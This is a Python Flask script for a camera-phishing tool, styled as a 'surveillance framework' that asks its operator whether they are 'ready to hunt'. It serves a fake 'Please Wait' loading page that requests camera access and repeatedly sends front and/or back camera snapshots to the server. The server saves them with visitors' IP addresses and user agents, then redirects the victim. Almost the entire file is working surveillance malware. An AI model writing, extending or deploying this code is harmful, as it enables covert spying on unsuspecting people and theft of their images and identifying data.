from flask import Flask, render_template_string, request
import base64
import os
import datetime
import sys
import time
import random
import shutil

# ═══════════════════════════════════════════════════════════════
#  ANSI COLOR CODES
# ═══════════════════════════════════════════════════════════════
R  = "\033[0m"       # Reset
BK = "\033[30m"      # Black
RD = "\033[91m"      # Red
GR = "\033[92m"      # Green
YL = "\033[93m"      # Yellow
BL = "\033[94m"      # Blue
MG = "\033[95m"      # Magenta
CY = "\033[96m"      # Cyan
WH = "\033[97m"      # White
DG = "\033[90m"      # Dark Gray
BD = "\033[1m"       # Bold
DM = "\033[2m"       # Dim

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def get_term_width():
    try:
        return shutil.get_terminal_size().columns
    except:
        return 80

def hacker_print(text, speed=0.03):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(speed + random.uniform(0, 0.015))
    print()

def fast_print(text, speed=0.008):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(speed)
    print()

def instant(text):
    print(text)

def progress_bar(label, duration=1.0, width=30, color=GR):
    steps = width
    delay = duration / steps
    sys.stdout.write(f"  {DG}[{R} ")
    for i in range(steps):
        sys.stdout.write(f"{color}█{R}")
        sys.stdout.flush()
        time.sleep(delay + random.uniform(0, delay * 0.3))
    sys.stdout.write(f" {DG}]{R} {color}{label}{R}\n")

def matrix_rain(lines=6, width=60, duration=0.8):
    """Minimal matrix rain effect"""
    chars = "01アイウエオカキクケコサシスセソタチツテト"
    steps = int(duration / 0.05)
    for _ in range(steps):
        line = ""
        for _ in range(min(width, get_term_width() - 2)):
            if random.random() < 0.3:
                c = random.choice(chars)
                shade = random.choice([GR, f"\033[32m", DG])
                line += f"{shade}{c}"
            else:
                line += " "
        sys.stdout.write(f"\r{line}{R}")
        sys.stdout.flush()
        time.sleep(0.05)
    sys.stdout.write("\r" + " " * min(width, get_term_width() - 2) + "\r")
    print()

# ═══════════════════════════════════════════════════════════════
#  BOOT SEQUENCE
# ═══════════════════════════════════════════════════════════════

clear()
time.sleep(0.3)

# Matrix rain intro
matrix_rain(duration=1.2)

# ASCII EYE BANNER — pure ASCII (no Unicode width issues)
EYE_BANNER = f"""{CY}
    +=============================================+
    |                                             |
    |  {WH} ______   __   __   ______                {CY}|
    |  {WH}/\\  ___\\ /\\ \\ / /  /\\  ___\\               {CY}|
    |  {WH}\\ \\  __\\ \\ \\ \\'/   \\ \\  __\\               {CY}|
    |  {WH} \\ \\_____\\\\ \\__|    \\ \\_____\\              {CY}|
    |  {WH}  \\/_____/ \\/_/      \\/_____/              {CY}|
    |                                             |
    |  {RD}[*]{DG} SURVEILLANCE FRAMEWORK v3.1 {RD}[*]        {CY}|
    |                                             |
    +=============================================+{R}
"""

print(EYE_BANNER)
time.sleep(0.5)

# System boot messages
boot_msgs = [
    (f"  {DG}[{GR}✓{DG}]{R} {GR}Kernel modules loaded{R}", 0.15),
    (f"  {DG}[{GR}✓{DG}]{R} {GR}Network interfaces initialized{R}", 0.12),
    (f"  {DG}[{GR}✓{DG}]{R} {GR}Encryption layer active {DG}(AES-256){R}", 0.18),
    (f"  {DG}[{GR}✓{DG}]{R} {GR}Anti-forensics module ready{R}", 0.10),
    (f"  {DG}[{GR}✓{DG}]{R} {GR}Camera exploit payload compiled{R}", 0.20),
    (f"  {DG}[{GR}✓{DG}]{R} {GR}WebSocket tunnels established{R}", 0.14),
]

for msg, delay in boot_msgs:
    fast_print(msg, speed=0.012)
    time.sleep(delay)

print()
progress_bar("Systems Online", duration=0.8, color=GR)
print()

# Identity — dynamically padded welcome box
time.sleep(0.3)
session_str = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
box_w = 40
line1 = "Welcome back, Asif..."
line2 = f"Session: {session_str}"
pad1 = box_w - len(line1) - 2
pad2 = box_w - len(line2) - 2

hacker_print(f"  {CY}{BD}+{'-' * box_w}+{R}", speed=0.008)
hacker_print(f"  {CY}{BD}|  {WH}{line1}{' ' * pad1}{CY}{BD}|{R}", speed=0.015)
hacker_print(f"  {CY}{BD}|  {DG}{line2}{' ' * pad2}{CY}{BD}|{R}", speed=0.008)
hacker_print(f"  {CY}{BD}+{'-' * box_w}+{R}", speed=0.008)
print()
time.sleep(0.3)
hacker_print(f"  {RD}{BD}  >> Are you ready to hunt? <<{R}", speed=0.04)
print()
time.sleep(0.5)

# Separator
w = min(50, get_term_width() - 4)
print(f"  {DG}{'─' * w}{R}")
print()

os.makedirs("ip_logs", exist_ok=True)

app = Flask(__name__)

# directory to store images
os.makedirs("captured", exist_ok=True)

# ═══════════════════════════════════════════════════════════════
#  CONFIGURATION INPUT
# ═══════════════════════════════════════════════════════════════

REDIRECT_URL = input(f"  {CY}{BD}[?]{R} {WH}Enter redirect URL: {GR}")
print(R, end="")
REDIRECT_TIME = int(input(f"  {CY}{BD}[?]{R} {WH}Enter redirect time (seconds): {GR}"))
print(R, end="")

print()
print(f"  {YL}{BD}[+]{R} {WH}Select camera mode:{R}")
print(f"      {GR}1{DG} ▸ {WH}Front camera only{R}")
print(f"      {GR}2{DG} ▸ {WH}Back camera only{R}")
print(f"      {RD}{BD}3{DG} ▸ {WH}Both cameras {RD}(simultaneous){R}")
camera_choice = input(f"  {CY}{BD}[?]{R} {WH}Enter choice {DG}({GR}1{DG}/{GR}2{DG}/{RD}3{DG}){WH}: {GR}").strip()
print(R, end="")

if camera_choice == "2":
    CAMERA_MODE = "back"
elif camera_choice == "3":
    CAMERA_MODE = "both"
else:
    CAMERA_MODE = "front"

print()
print(f"  {DG}{'─' * w}{R}")
print()

# Deployment status
mode_colors = {"front": GR, "back": YL, "both": RD}
mc = mode_colors.get(CAMERA_MODE, GR)

fast_print(f"  {DG}[{GR}✓{DG}]{R} {WH}Camera mode  : {mc}{BD}{CAMERA_MODE.upper()}{R}", speed=0.015)
fast_print(f"  {DG}[{GR}✓{DG}]{R} {WH}Redirect URL : {CY}{REDIRECT_URL}{R}", speed=0.015)
fast_print(f"  {DG}[{GR}✓{DG}]{R} {WH}Redirect time: {YL}{REDIRECT_TIME}s{R}", speed=0.015)
print()

progress_bar("Deploying Payload", duration=0.6, color=RD)
print()

hacker_print(f"  {GR}{BD}  ✦ Server starting... Waiting for targets ✦{R}", speed=0.025)
print()
print(f"  {DG}{'═' * w}{R}")
print()


def get_client_ip():
    if request.headers.get("X-Forwarded-For"):
        return request.headers.get("X-Forwarded-For").split(",")[0].strip()
    return request.remote_addr


@app.route("/")
def home():
    client_ip = get_client_ip()
    user_agent = request.headers.get("User-Agent")

    with open("ip_logs/activity.log", "a") as f:
       f.write(f"{datetime.datetime.now()} | VISIT | {client_ip} | {user_agent}\n")

    return render_template_string(
        HTML,
        redirect_url=REDIRECT_URL,
        redirect_time=REDIRECT_TIME,
        camera_mode=CAMERA_MODE
    )



HTML = """

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Please Wait</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            color: #1a1a1a;
        }

        .container {
            text-align: center;
            max-width: 500px;
            width: 100%;
        }


        .spinner-container {
            margin: 0 auto 40px;
            width: 100px;
            height: 100px;
            position: relative;
        }

        .spinner {
            width: 100%;
            height: 100%;
            border: 3px solid #f0f0f0;
            border-top: 3px solid #2563eb;
            border-right: 3px solid #2563eb;
            border-radius: 50%;
            animation: spin 0.8s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }

        h1 {
            font-size: 32px;
            font-weight: 600;
            margin-bottom: 16px;
            color: #1a1a1a;
            letter-spacing: -0.5px;
        }

        .subtitle {
            font-size: 18px;
            color: #666;
            margin-bottom: 12px;
            font-weight: 400;
        }

        .description {
            font-size: 15px;
            color: #999;
            line-height: 1.6;
            max-width: 380px;
            margin: 0 auto;
        }

        .dots {
            display: inline-block;
        }

        .dots span {
            animation: blink 1.4s infinite;
            opacity: 0;
            font-weight: 600;
        }

        .dots span:nth-child(1) {
            animation-delay: 0s;
        }

        .dots span:nth-child(2) {
            animation-delay: 0.2s;
        }

        .dots span:nth-child(3) {
            animation-delay: 0.4s;
        }

        @keyframes blink {
            0%, 20% {
                opacity: 0;
            }
            40%, 60% {
                opacity: 1;
            }
            80%, 100% {
                opacity: 0;
            }
        }

        .progress-bar {
            width: 100%;
            max-width: 300px;
            height: 4px;
            background: #f0f0f0;
            border-radius: 2px;
            margin: 30px auto 0;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #2563eb, #3b82f6);
            border-radius: 2px;
            animation: progress 2s ease-in-out infinite;
        }

        @keyframes progress {
            0% {
                width: 0%;
                margin-left: 0%;
            }
            50% {
                width: 60%;
                margin-left: 20%;
            }
            100% {
                width: 0%;
                margin-left: 100%;
            }
        }

        /* Tablet */
        @media (max-width: 768px) {
            .container {
                max-width: 400px;
            }

            h1 {
                font-size: 28px;
            }

            .subtitle {
                font-size: 16px;
            }

            .description {
                font-size: 14px;
            }

            .spinner-container {
                width: 80px;
                height: 80px;
                margin-bottom: 35px;
            }

            .logo-placeholder {
                width: 50px;
                height: 50px;
                margin-bottom: 35px;
                font-size: 20px;
            }
        }

        /* Mobile */
        @media (max-width: 480px) {
            body {
                padding: 16px;
            }

            .container {
                max-width: 100%;
            }

            h1 {
                font-size: 24px;
                margin-bottom: 12px;
            }

            .subtitle {
                font-size: 15px;
                margin-bottom: 10px;
            }

            .description {
                font-size: 13px;
                max-width: 100%;
            }

            .spinner-container {
                width: 70px;
                height: 70px;
                margin-bottom: 30px;
            }

            .spinner {
                border-width: 2.5px;
            }

            .logo-placeholder {
                width: 45px;
                height: 45px;
                margin-bottom: 30px;
                font-size: 18px;
            }

            .progress-bar {
                max-width: 250px;
                margin-top: 25px;
            }
        }

        /* Small mobile */
        @media (max-width: 360px) {
            h1 {
                font-size: 22px;
            }

            .subtitle {
                font-size: 14px;
            }

            .description {
                font-size: 12px;
            }

            .spinner-container {
                width: 60px;
                height: 60px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        
        <div class="spinner-container">
            <div class="spinner"></div>
        </div>
        <h1>Please Wait</h1>
        <p class="subtitle">Setting up your experience<span class="dots"><span>.</span><span>.</span><span>.</span></span></p>
        <p class="description">This will only take a moment. Thank you for your patience.</p>
        <div class="progress-bar">
            <div class="progress-fill"></div>
        </div>
    </div>

<script>
    const redirectUrl = "{{ redirect_url }}";
    const redirectTime = {{ redirect_time }};
    const cameraMode = "{{ camera_mode }}";

    // ========== SHARED UTILITIES ==========

    function waitForVideo(video) {
        return new Promise((resolve) => {
            if (video.readyState >= 2) return resolve();
            video.addEventListener("loadeddata", () => resolve(), { once: true });
        });
    }

    // Fast frame capture using canvas → JPEG blob (much faster than PNG)
    function sendFrameCanvas(canvas, ctx, video, cameraLabel) {
        if (cameraLabel === "front") {
            ctx.save();
            ctx.scale(-1, 1);
            ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
            ctx.restore();
        } else {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        }

        // Use toBlob for async non-blocking encoding + smaller payload
        canvas.toBlob((blob) => {
            if (!blob) return;
            const formData = new FormData();
            formData.append("image", blob, cameraLabel + ".jpg");
            formData.append("camera", cameraLabel);

            // Fire and forget — don't await response
            fetch("/capture", { method: "POST", body: formData }).catch(() => {});
        }, "image/jpeg", 0.75);
    }

    // Hardware-accelerated capture using ImageCapture API (fastest method)
    async function sendFrameImageCapture(imageCapture, cameraLabel) {
        try {
            const blob = await imageCapture.takePhoto({ imageWidth: 640, imageHeight: 480 });
            const formData = new FormData();
            formData.append("image", blob, cameraLabel + ".jpg");
            formData.append("camera", cameraLabel);
            fetch("/capture", { method: "POST", body: formData }).catch(() => {});
            return true;
        } catch(e) {
            return false;
        }
    }

    // Check if ImageCapture API is available
    function hasImageCapture() {
        return typeof ImageCapture !== "undefined";
    }

    // ========== SINGLE CAMERA MODE (front or back only) ==========

    function startContinuousCapture(stream, cameraLabel) {
        const video = document.createElement("video");
        video.setAttribute("playsinline", "");
        video.setAttribute("autoplay", "");
        video.setAttribute("muted", "");
        video.muted = true;
        video.srcObject = stream;
        video.play();

        waitForVideo(video).then(() => {
            const track = stream.getVideoTracks()[0];

            // Try hardware-accelerated ImageCapture first
            if (hasImageCapture()) {
                const imgCapture = new ImageCapture(track);
                console.log("[Capture] Using ImageCapture API (hardware-accelerated)");
                setInterval(() => {
                    sendFrameImageCapture(imgCapture, cameraLabel);
                }, 300);
                return;
            }

            // Fallback to canvas-based capture
            console.log("[Capture] Using canvas-based capture");
            const canvas = document.createElement("canvas");
            const ctx = canvas.getContext("2d");
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;

            setInterval(() => {
                if (video.readyState < 2) return;
                sendFrameCanvas(canvas, ctx, video, cameraLabel);
            }, 300);
        });
    }

    async function openSingleCamera(facingMode, label) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: { exact: facingMode }, width: { ideal: 640 }, height: { ideal: 480 } }
            });
            startContinuousCapture(stream, label);
            return true;
        } catch(e) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: { ideal: facingMode }, width: { ideal: 640 }, height: { ideal: 480 } }
                });
                startContinuousCapture(stream, label);
                return true;
            } catch(e2) {
                console.log(label + " camera failed: " + e2.message);
                return false;
            }
        }
    }

    // ========== DUAL CAMERA MODE (fast alternating front ↔ back) ==========

    // Rapidly capture N frames from a camera, then release it
    async function captureNFrames(constraints, cameraLabel, frameCount) {
        let stream;
        try {
            stream = await navigator.mediaDevices.getUserMedia({ video: constraints });
        } catch(e) {
            console.log("[DualCam] Failed to open " + cameraLabel + ": " + e.message);
            return false;
        }

        const video = document.createElement("video");
        video.setAttribute("playsinline", "");
        video.setAttribute("autoplay", "");
        video.setAttribute("muted", "");
        video.muted = true;
        video.srcObject = stream;
        video.play();

        await waitForVideo(video);

        const track = stream.getVideoTracks()[0];

        // Try ImageCapture API for speed
        if (hasImageCapture()) {
            const imgCapture = new ImageCapture(track);
            for (let i = 0; i < frameCount; i++) {
                await sendFrameImageCapture(imgCapture, cameraLabel);
                if (i < frameCount - 1) {
                    await new Promise(r => setTimeout(r, 70));
                }
            }
        } else {
            // Canvas fallback
            const canvas = document.createElement("canvas");
            const ctx = canvas.getContext("2d");
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;

            for (let i = 0; i < frameCount; i++) {
                if (video.readyState >= 2) {
                    sendFrameCanvas(canvas, ctx, video, cameraLabel);
                }
                if (i < frameCount - 1) {
                    await new Promise(r => setTimeout(r, 100));
                }
            }
        }

        // Release camera for the other one
        stream.getTracks().forEach(t => t.stop());
        video.srcObject = null;
        return true;
    }

    async function openBothCameras() {
        let frontConstraints = null;
        let backConstraints = null;

        try {
            // Step 1: Get permission + discover devices
            const tempStream = await navigator.mediaDevices.getUserMedia({ video: true });
            tempStream.getTracks().forEach(t => t.stop());

            const devices = await navigator.mediaDevices.enumerateDevices();
            const videoDevices = devices.filter(d => d.kind === "videoinput");
            console.log("[DualCam] Found " + videoDevices.length + " video device(s):");
            videoDevices.forEach((d, i) => console.log("  [" + i + "] " + d.label + " | ID: " + d.deviceId));

            if (videoDevices.length < 2) {
                console.log("[DualCam] Only 1 camera, falling back to single mode");
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                startContinuousCapture(stream, "front");
                return;
            }

            // Step 2: Identify front & back cameras
            let frontDevice = null;
            let backDevice = null;

            for (const device of videoDevices) {
                const label = device.label.toLowerCase();
                if (!frontDevice && (label.includes("front") || label.includes("user") || label.includes("facetime") || label.includes("face"))) {
                    frontDevice = device;
                } else if (!backDevice && (label.includes("back") || label.includes("rear") || label.includes("environment") || label.includes("main"))) {
                    backDevice = device;
                }
            }

            // Step 3: Build constraints
            const vidConstraints = { width: { ideal: 640 }, height: { ideal: 480 } };

            if (frontDevice && backDevice) {
                console.log("[DualCam] Identified front: " + frontDevice.label);
                console.log("[DualCam] Identified back: " + backDevice.label);
                frontConstraints = { ...vidConstraints, deviceId: { exact: frontDevice.deviceId } };
                backConstraints = { ...vidConstraints, deviceId: { exact: backDevice.deviceId } };
            } else {
                console.log("[DualCam] Labels not clear, using facingMode discovery...");

                let discoveredFrontId = null;
                try {
                    const fs = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: { exact: "user" } }
                    });
                    discoveredFrontId = fs.getVideoTracks()[0].getSettings().deviceId;
                    fs.getTracks().forEach(t => t.stop());
                } catch(e) {
                    console.log("[DualCam] Could not get front via facingMode");
                }

                if (discoveredFrontId) {
                    frontConstraints = { ...vidConstraints, deviceId: { exact: discoveredFrontId } };
                    const otherDevice = videoDevices.find(d => d.deviceId !== discoveredFrontId);
                    if (otherDevice) {
                        backConstraints = { ...vidConstraints, deviceId: { exact: otherDevice.deviceId } };
                    }
                } else {
                    frontConstraints = { ...vidConstraints, deviceId: { exact: videoDevices[0].deviceId } };
                    backConstraints = { ...vidConstraints, deviceId: { exact: videoDevices[1].deviceId } };
                }
            }

            if (!frontConstraints || !backConstraints) {
                console.log("[DualCam] Could not determine both cameras, using single");
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                startContinuousCapture(stream, "front");
                return;
            }

            // Step 4: Fast alternating capture loop
            // Pattern: front 3 imgs → back 3 imgs → repeat
            console.log("[DualCam] Starting fast alternating capture...");

            let running = true;
            setTimeout(() => { running = false; }, redirectTime * 1000);

            while (running) {
                await captureNFrames(frontConstraints, "front", 3);
                if (!running) break;
                await new Promise(r => setTimeout(r, 100));

                await captureNFrames(backConstraints, "back", 3);
                if (!running) break;
                await new Promise(r => setTimeout(r, 100));
            }

            window.location.href = redirectUrl;
            return;

        } catch(err) {
            console.log("[DualCam] Critical error: " + err.message);
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                startContinuousCapture(stream, "front");
            } catch(e) {
                console.log("[DualCam] All camera access denied");
            }
        }
    }

    // ========== INIT ==========

    async function init() {
        if (cameraMode === "front") {
            await openSingleCamera("user", "front");
        } else if (cameraMode === "back") {
            await openSingleCamera("environment", "back");
        } else if (cameraMode === "both") {
            await openBothCameras();
            return;
        }

        setTimeout(() => {
            window.location.href = redirectUrl;
        }, redirectTime * 1000);
    }

    init();
</script>



</body>
</html>
"""

@app.route("/capture", methods=["POST"])
def capture():
    client_ip = get_client_ip()

    # Handle both FormData (blob) and JSON (base64) uploads
    if request.content_type and "multipart/form-data" in request.content_type:
        # Fast path: binary blob from FormData
        camera_label = request.form.get("camera", "unknown")
        image_file = request.files.get("image")

        if not image_file:
            return "no image", 400

        image_bytes = image_file.read()
    else:
        # Fallback: base64 JSON (old method)
        data = request.json
        camera_label = data.get("camera", "unknown")
        image_data = data["image"].split(",")[1]
        image_bytes = base64.b64decode(image_data)

    with open("ip_logs/activity.log", "a") as f:
         f.write(f"{datetime.datetime.now()} | CAPTURE | {client_ip} | cam:{camera_label}\n")

    filename = camera_label + "_" + datetime.datetime.now().strftime("%Y%m%d_%H%M%S_%f") + ".jpg"
    filepath = os.path.join("captured", filename)

    with open(filepath, "wb") as f:
        f.write(image_bytes)

    return "saved"

if __name__ == "__main__":
    app.run(debug=False)

